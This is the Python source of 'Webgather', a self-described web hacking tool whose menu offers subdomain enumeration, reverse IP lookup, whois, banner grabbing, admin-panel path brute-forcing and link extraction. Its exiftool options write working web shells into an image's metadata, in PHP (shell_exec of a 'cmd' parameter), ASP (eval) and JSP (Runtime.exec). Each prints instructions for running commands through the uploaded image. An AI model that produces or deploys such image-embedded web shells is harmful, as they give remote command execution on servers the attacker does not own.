"""
Script Created By:
    Xina0x
Page:
    https://github.com/xina0x/
Copyrights:
    xina0x 2021
    MIT LICENSE
"""
try:
    from colorama import Fore, Back, Style
except:
    print("[!] colorama module  not installed")

try:
    import requests
except:
    print("[!] requests module  not installed")

try:
    from bs4 import BeautifulSoup
except:
    print("[!] bs4 module  not installed")

try:
    import cloudscraper
except:
    print("[!] cloudscraper module  not installed")

try:
    import whois
except:
    print("[!] python-whois module  not installed")

try:
    import time
    import shutil
    import socket
    import os
except:
    print("[!] Some problem with time, shutil, socket or os modules")
try:
    from pathlib import Path
except:
    print("[!] pathlib module not installed")

try:
    import urllib.request
except:
    print("[!] urllib3 module not installed")

try:
    import re
except:
    print("[!] re module not installed")
home = str(Path.home())
Path("{0}/webgather".format(home)).mkdir(parents=True, exist_ok=True)

def clear():
    os.system('cls||clear')
    banner = '''
         _    _      _                 _   _               
        | |  | |    | |               | | | |              
        | |  | | ___| |__   __ _  __ _| |_| |__   ___ _ __ 
        | |/\| |/ _ \ '_ \ / _` |/ _` | __| '_ \ / _ \ '__|
        \  /\  /  __/ |_) | (_| | (_| | |_| | | |  __/ |   
        \/  \/ \___|_.__/ \__, |\__,_|\__|_| |_|\___|_|   
                            __/ |                          
                           |___/                           
     
     ..::  Webgather web hacking tool ::..               -- version 1.0
                         
    '''

    print(Fore.GREEN + banner)


def slowprint(s):
    for c in s + '\n':
        os.sys.stdout.write(c)
        os.sys.stdout.flush()
        time.sleep(5. / 100)
    time.sleep(2)


def options():
    optionList = '''
    [1]  Subdomains Finder
    [2]  Reverse IP
    [3]  whois
    [4]  Exiftool image shell (php)
    [5]  Exiftool image shell (asp)
    [6]  Exiftool image shell (jsp)
    [7]  Banner Grab
    [8]  Admin Panel Finder
    [9]  Page Link Extractors
    '''
    print(Fore.RED + optionList)
    option = input("[+] Enter your option \t")
    if(option == "1"):
        clear()
        subdomain()
    elif(option == "2"):
        clear()
        reverse()
    elif(option == "3"):
        clear()
        whoiser()
    elif(option == "4"):
        clear()
        exiftool(0)
    elif(option == "5"):
        clear()
        exiftool(1)
    elif(option == "6"):
        clear()
        exiftool(2)
    elif(option == "7"):
        clear()
        bannerGrab()
    elif(option == "8"):
        clear()
        adminPanel()
    elif(option == "9"):
        clear()
        linkExtract()
    else:
        recreate()


def subdomain():
    target = input(
        Fore.RED + "[+] Target (like google.com) without http or www: \t")
    if target.find("http") != -1 or target.find("https") != -1:
        print(Fore.RED + "[!] Don't put http or https at the beginning of url")
        time.sleep(1)
        subdomain()
    listOfSubs = []
    source = requests.get("https://crt.sh/?q={0}".format(target))
    soup = BeautifulSoup(source.content, 'lxml')
    for i in soup.select("br"):
        i.replace_with("\n")
    for row in soup.findAll('table')[2].findAll('tr')[1:]:
        listOfSubs.append(row.findAll('td')[5].get_text())
    listOfSubs = list(dict.fromkeys(listOfSubs))
    print("\n")
    print(*set(listOfSubs), sep="\n")
    with open(home + "/webgather/" + target+"-subdomains.txt", 'w+') as f:
        for item in listOfSubs:
            f.write("%s\n" % item)
    print(Fore.LIGHTMAGENTA_EX +
          "\n [!] Found {0} subdomains. results Also saved in {1}/webgather/{2}-subdomains.txt \n" .format(len(listOfSubs), home, target))
    input("")
    recreate()


def reverse():
    target = input(
        "[+] Target (like google.com) without http or www - or IP: \t")
    if target.find("http") != -1 or target.find("https") != -1:
        print(Fore.RED + "[!] Don't put http or https at the beginning of url")
        time.sleep(1)
        reverse()
    scraper = cloudscraper.create_scraper()
    source = scraper.get(
        "https://viewdns.info/reverseip/?host={0}&t=1".format(target)).text
    listOfSites = []
    soup = BeautifulSoup(source, 'lxml')
    for i in soup.select("br"):
        i.replace_with("\n")
    for row in soup.findAll('table')[3].findAll('tr')[1:]:
        listOfSites.append(row.findAll('td')[0].get_text())
    listOfSites = list(dict.fromkeys(listOfSites))
    print("\n")
    print(*set(listOfSites), sep="\n")
    with open(home + "/webgather/" + target+"-reverse.txt", 'w+') as f:
        for item in listOfSites:
            f.write("%s\n" % item)
    print(Fore.LIGHTMAGENTA_EX +
          "\n [!] Found {0} Websites on the server. results Also saved in {1}/webgather/{2}-reverse.txt \n" .format(len(listOfSites), home, target))
    input("")
    recreate()


def whoiser():
    target = input(
        "[+] Target (like google.com) without http or www - or IP: \t")
    if target.find("http") != -1 or target.find("https") != -1:
        print(Fore.RED + "[!] Don't put http or https at the beginning of url")
        sleep(1)
        whoiser()
    w = whois.whois(target)
    f = open(home + "/webgather/" + target+"-whois.txt", "w+")
    f.write(str(w))
    f.close()
    print("\n")
    print(w)

    print(Fore.RED + 
        "\n [!] results Also saved in {0}/webgather/{1}-whois.txt" .format(home, target))
    input("")
    recreate()


def exiftool(prog):
    print(Fore.LIGHTGREEN_EX +
          "[!] If didn't work install exiftool manually then run the script https://exiftool.org/ \n")
    time.sleep(1)
    # For php
    if prog == 0:
        try:
            print(
                Fore.RED + "[!] Will now download original image ...." + Fore.GREEN)
            os.system(
                "wget https://www.stockvault.net/data/2011/05/31/124348/thumb16.jpg")
            print(
                Fore.RED + "[!] image downloaded start  to inject payload ...." + Fore.GREEN)
            os.system(
                """ exiftool -Comment="<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>" thumb16.jpg """)
            os.system(
                "mv thumb16.jpg {0}/webgather/payload-php.jpg" .format(home))
            os.system("rm thumb16.jpg_original")
            print(Fore.RED + '''[!] Injection completed and file saved in {0}/payload.jpg
        Ex:   website.com/payload.jpg?cmd=ls ''' .format(home))
        except:
            print("[-] Some error occured")
    # For asp.net
    elif prog == 1:
        try:
            print(
                Fore.RED + "[!] Will now download original image ...." + Fore.GREEN)
            os.system(
                "wget https://www.stockvault.net/data/2011/05/31/124348/thumb16.jpg")
            print(
                Fore.RED + "[!] image downloaded start  to inject payload ...." + Fore.GREEN)
            os.system(
                """ exiftool -Comment="<% eval request("cmd") %>" thumb16.jpg """)
            os.system(
                "mv thumb16.jpg {0}/webgather/payload-asp.jpg" .format(home))
            os.system("rm thumb16.jpg_original")
            print(Fore.RED + '''[!] Injection completed and file saved in {0}/payload.jpg
        Ex:   website.com/payload.jpg?cmd=ls ''' .format(home))
        except:
            print("[-] Some error occured")
    elif prog == 2:
        try:
            print(
                Fore.RED + "[!] Will now download original image ...." + Fore.GREEN)
            os.system(
                "wget https://www.stockvault.net/data/2011/05/31/124348/thumb16.jpg")
            print(
                Fore.RED + "[!] image downloaded start  to inject payload ...." + Fore.GREEN)
            os.system(
                """ exiftool -Comment="<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>" thumb16.jpg """)
            os.system(
                "mv thumb16.jpg {0}/webgather/payload.jpg" .format(home))
            os.system("rm thumb16.jpg_original")
            print(Fore.RED + '''[!] Injection completed and file saved in {0}/webgather/payload-jsp.jpg
        Ex:   website.com/payload.jpg?cmd=ls ''' .format(home))
        except:
            print("[-] Some error occured")
    input("")
    recreate()


def bannerGrab():
    IP = input("[+] IP address ?? \t")
    PORT = input("[+] Port address ?? \t")
    s = socket.socket()
    s.connect((IP, int(PORT)))
    s.send(b'GET /\n\n')
    b = s.recv(10000).decode('utf-8')
    print("\n" + Fore.WHITE + str(b))
    input("")
    recreate()


def adminPanel():
    ext = input(
        "[+] For a better performance type the file extension (php,aspx,etc ...) : \t")
    ext = ext.replace(".", "")
    print(ext)
    print("[!] URL should start with protocol ( http or https )")
    print("[!] URL should have a / at the end")
    url = input("[+] Enter the website  address with the following rules: \t")
    if url.find("http") == -1 and url.find("https") == -1:
        clear()
        print(Fore.RED + "[!] Please include protocol For the URL (http https)")
        time.sleep(1)
        adminPanel()
    if url[-1] != "/":
        print(Fore.RED +  "[!] please add slash (/) at the end of URL")
        time.sleep(1)
        adminPanel()
    adminPaths = ('login', 'admin/account', 'admin/index', 'admin/login', 'admin/admin', 'admin/account', 'admin_area/admin', 'admin_area/login', 'siteadmin/login', 'siteadmin/index', 'admin_area/index', 'bb-admin/index', 'bb-admin/login', 'bb-admin/admin', 'admin/home', 'admin/controlpanel', 'admin', 'admin/cp', 'cp', 'administrator/index', 'administrator/login', 'nsw/admin/login', 'webadmin/login', 'admin/admin_login', 'admin_login', 'administrator/account', 'administrator', 'pages/admin/admin-login', 'admin/admin-login', 'admin-login', 'acceso', 'login', 'modelsearch/login', 'moderator', 'moderator/login',
                  'moderator/admin', 'account', 'controlpanel', 'admincontrol', 'rcjakar/admin/login', 'webadmin', 'webadmin/index', 'webadmin/admin', 'adminpanel', 'user', 'panel-administracion/login', 'wp-login', 'adminLogin', 'admin/adminLogin', 'home', 'admin', 'adminarea/index', 'adminarea/admin', 'adminarea/login', 'panel-administracion/index', 'panel-administracion/admin', 'modelsearch/index', 'modelsearch/admin', 'admincontrol/login', 'adm/admloginuser', 'admloginuser', 'admin2', 'admin2/login', 'admin2/index', 'usuarios/login', 'adm/index', 'adm', 'affiliate', 'adm_auth', 'memberadmin', 'administratorlogin', 'cpanel')
    print(Fore.LIGHTRED_EX + "[-] File base started please wait")
    for adminPath in adminPaths:
        curl = url + adminPath + "." + ext
        try:
            req = urllib.request.urlopen(curl)
            print("_____________________________________________________________")
            print("                                                             ")
            print("\033[92m :::: [!!!] ::: Admin Page found ::: "+curl)
            print("_____________________________________________________________")
        except urllib.error.URLError as msg:
            print ("\033[91m **** Page not found ::: "+curl)
    print("[-] Path base started please wait")
    for adminPath in adminPaths:
        curl = url + adminPath
        try:
            req = urllib.request.urlopen(curl)
            print("_____________________________________________________________")
            print("                                                             ")
            print("\033[92m :::: [!!!] ::: Admin Page found ::: "+curl)
            print("_____________________________________________________________")
        except urllib.error.URLError as msg:
            print ("\033[91m **** Page not found ::: "+curl)

def linkExtract():
    target = input(
        "[+] Target ( like https://google.com/ ) with http/https  \t")
    name = "links"
    scraper = cloudscraper.create_scraper()
    source = scraper.get(target).text
    soup = BeautifulSoup(source, 'html.parser')
    links = []
    for link in soup.find_all(attrs={'href': re.compile("http")}):
        links.append(link.get('href'))
    for link in soup.find_all(attrs={'href': re.compile("https")}):
        links.append(link.get('href'))
    print("\n")
    print(*set(links), sep="\n")
    with open(home + "/webgather/" + name+"-links.txt", 'w+') as f:
        for item in links:
            f.write("%s\n" % item)
    print(Fore.LIGHTMAGENTA_EX +
          "\n [!] Found {0} links (some were duplicate). results Also saved in {1}/webgather/{2}-links.txt \n" .format(len(links), home, name))
    input("")
    recreate()

def recreate():
    clear()
    options()


clear()
slowprint("[ !!! ] Professional web pentest tools by @Xina0x")
options()
